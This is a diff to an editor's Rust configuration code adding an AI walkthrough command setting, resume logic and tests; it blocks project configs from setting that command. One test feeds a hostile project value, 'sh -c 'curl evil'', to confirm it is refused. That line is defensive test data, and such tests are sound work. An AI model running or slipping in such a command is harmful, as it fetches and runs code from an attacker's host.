@@ -1,4 +1,5 @@
 use crate::risk::{self, Scope};
+use crate::walkthrough;
 use crate::{Effect, Opened, ReplaceFailed, State, View};
 use sha2::Digest;
 use std::collections::{BTreeMap, BTreeSet};
@@ -21,6 +22,10 @@ minimap = true
 
 [ai]
 env = ["HOME", "PATH", "USER", "LOGNAME", "SHELL", "TMPDIR", "LANG", "LC_ALL", "LC_CTYPE"]
+
+[walkthrough]
+driver = "pane"
+command = "claude -p"
 
 [risk]
 threshold = 15
@@ -882,6 +887,17 @@ const TEMPLATE_SETTINGS: &str = r#"# Varde reads this file on every start. A pro
 # here to pass it through. A project's config cannot add to this list.
 # env = ["HOME", "PATH", "USER", "LOGNAME", "SHELL", "TMPDIR", "LANG", "LC_ALL", "LC_CTYPE"]
 
+[walkthrough]
+
+# How `:guide` hands each request to the agent. "pane" pastes it into the AI
+# pane, starting the AI session if none is running. "background" runs `command`
+# once per request with the request on stdin, ignores what it prints, and shows
+# a non-zero exit in the footer. Add your CLI's resume flags to `command` if you
+# want one conversation across requests: each request already names the plan
+# file and the current Waypoint.
+# driver = "pane"
+# command = "claude -p"
+
 [risk]
 
 # The cyclomatic complexity a function may reach before Risk names it.
@@ -1010,6 +1026,7 @@ pub struct Startup {
     pub shipped: BTreeMap<PathBuf, String>,
     pub state_json: Option<String>,
     pub risk_json: Option<String>,
+    pub walkthrough_json: Option<String>,
     pub head: Option<String>,
     pub repo: Option<Vec<crate::review::GitFile>>,
     pub checkout: Option<PathBuf>,
@@ -1210,6 +1227,12 @@ pub enum FactValue {
 }
 
 #[derive(Default, serde::Deserialize)]
+struct Walkthrough {
+    #[serde(default)]
+    driver: walkthrough::Driver,
+}
+
+#[derive(Default, serde::Deserialize)]
 struct Ai {
     #[serde(default)]
     env: Vec<String>,
@@ -1226,6 +1249,8 @@ struct Knowledge {
 struct Layer {
     #[serde(default)]
     ai: Ai,
+    #[serde(default)]
+    walkthrough: Walkthrough,
     #[serde(default)]
     knowledge: Knowledge,
     #[serde(default)]
@@ -1386,6 +1411,7 @@ pub fn start(input: &Startup) -> Result<(State, Config, Vec<Effect>), StartupErr
         .map(|breakpoint| breakpoint.file.clone())
         .collect();
     effects.extend(files.into_iter().map(Effect::ReadBreakpointFile));
+    effects.extend(resume_walkthrough(&mut state, input));
 
     let cache = cached(input);
     let unmeasured = cache.is_none();
@@ -1427,6 +1453,7 @@ pub(crate) fn merged_config(
         let (mut overlay, mentioned) = parse(source, label)?;
         if label == PROJECT_LABEL {
             overlay.remove("ai");
+            overlay.remove("walkthrough");
             overlay.remove("knowledge");
         }
         origins.extend(mentioned);
@@ -1629,6 +1656,8 @@ fn configure(state: &mut State, config: &Config) {
             .and_then(|cap| cap.parse().ok())
             .unwrap_or(risk::DEFAULT_MAX_ITERATIONS),
         test_command: config.get("risk.test_command"),
+        walkthrough_driver: config.layer().walkthrough.driver,
+        walkthrough_command: config.get("walkthrough.command").unwrap_or_default(),
         servers: config.servers(),
         formatters: config.formatters(),
         facts: config.facts(),
@@ -1952,6 +1981,24 @@ fn saved_window(state_json: Option<&str>) -> Option<crate::layout::Area> {
     })
 }
 
+fn resume_walkthrough(state: &mut State, input: &Startup) -> Option<Effect> {
+    let parsed: serde_json::Value = serde_json::from_str(input.state_json.as_deref()?).ok()?;
+    let saved = parsed.get("walkthrough")?;
+    let plan = crate::walkthrough::parse(input.walkthrough_json.as_deref()?)
+        .ok()
+        .filter(|plan| plan.status != crate::walkthrough::Status::Ended)?;
+    state.walkthrough = Some(crate::walkthrough::Session {
+        current: Some(saved.get("current")?.as_str()?.to_string()),
+        inserted: serde_json::from_value(saved.get("inserted")?.clone()).ok()?,
+        ..Default::default()
+    });
+    Some(Effect::ReadWalkthroughFiles {
+        root: state.root.clone(),
+        files: crate::walkthrough::files(&plan),
+        plan,
+    })
+}
+
 fn saved_text(state_json: Option<&str>, key: &str) -> Option<String> {
     let parsed: serde_json::Value = serde_json::from_str(state_json?).ok()?;
     parsed.get(key)?.as_str().map(str::to_string)
@@ -2010,6 +2057,33 @@ mod tests {
         })
         .expect("started");
         assert_eq!(state.corner, crate::layout::Corner::Breakpoints);
+    }
+
+    #[test]
+    fn a_walkthrough_resumes_unless_its_plan_says_ended() {
+        let saved = r#"{"walkthrough": {"current": "w2", "inserted": ["w1"]}}"#;
+        let plan = |status: &str| {
+            format!(
+                r#"{{"version": 1, "status": "{status}", "checkpoint": "w1", "waypoints": [
+                  {{"id": "w1", "file": "a.rs", "line": 1, "kind": "code", "text": "Do", "verdict": null, "ai": false}},
+                  {{"id": "w2", "file": "a.rs", "line": 2, "kind": "code", "text": "Do", "verdict": null, "ai": false}}
+                ]}}"#
+            )
+        };
+        let resumed = |status: &str| {
+            start(&Startup {
+                state_json: Some(saved.to_string()),
+                walkthrough_json: Some(plan(status)),
+                ..Startup::default()
+            })
+            .expect("started")
+            .0
+            .walkthrough
+            .and_then(|session| session.current)
+        };
+        assert_eq!(resumed("active"), Some("w2".to_string()));
+        assert_eq!(resumed("completed"), Some("w2".to_string()));
+        assert_eq!(resumed("ended"), None);
     }
 
     #[test]
@@ -2641,6 +2715,41 @@ mod tests {
     }
 
     #[test]
+    fn the_walkthrough_command_is_the_users_and_never_a_projects() {
+        let defaults = Config(merged_config(None, None).expect("parses"));
+        assert_eq!(defaults.get("walkthrough.driver").as_deref(), Some("pane"));
+        assert_eq!(
+            defaults.get("walkthrough.command").as_deref(),
+            Some("claude -p")
+        );
+        let project = "[walkthrough]\ndriver = \"background\"\ncommand = \"sh -c 'curl evil'\"\n";
+        let refused = Config(merged_config(None, Some(project)).expect("parses"));
+        assert_eq!(refused.get("walkthrough.driver").as_deref(), Some("pane"));
+        assert_eq!(
+            refused.get("walkthrough.command").as_deref(),
+            Some("claude -p")
+        );
+        let global = "[walkthrough]\ndriver = \"background\"\ncommand = \"claude -p --continue\"\n";
+        let chosen = Config(merged_config(Some(global), None).expect("parses"));
+        assert_eq!(
+            chosen.get("walkthrough.driver").as_deref(),
+            Some("background")
+        );
+        assert_eq!(
+            chosen.get("walkthrough.command").as_deref(),
+            Some("claude -p --continue")
+        );
+        assert_eq!(
+            chosen.layer().walkthrough.driver,
+            crate::walkthrough::Driver::Background
+        );
+        let misspelt = merged_config(Some("[walkthrough]\n\ndriver = \"backgound\"\n"), None)
+            .expect_err("an unknown driver is refused");
+        assert_eq!((misspelt.file.as_str(), misspelt.line), (GLOBAL_LABEL, 3));
+        assert!(matches!(misspelt.fault, ConfigFault::WrongType(_)));
+    }
+
+    #[test]
     fn the_seeded_config_is_commented_out_and_quotes_the_live_defaults() {
         let seeded: toml::Table = SEEDED_CONFIG.parse().expect("valid TOML");
         assert!(
@@ -2653,8 +2762,11 @@ mod tests {
         let uncommented = uncommented(SEEDED_CONFIG);
         let mut defaults = fresh().0;
         assert!(
-            defaults.remove("ai").is_some() && !uncommented.contains_key("ai"),
-            "a project's config names [ai], which a project cannot set"
+            defaults.remove("ai").is_some()
+                && defaults.remove("walkthrough").is_some()
+                && !uncommented.contains_key("ai")
+                && !uncommented.contains_key("walkthrough"),
+            "a project's config names [ai] or [walkthrough], which a project cannot set"
         );
         assert!(
             !uncommented.is_empty()
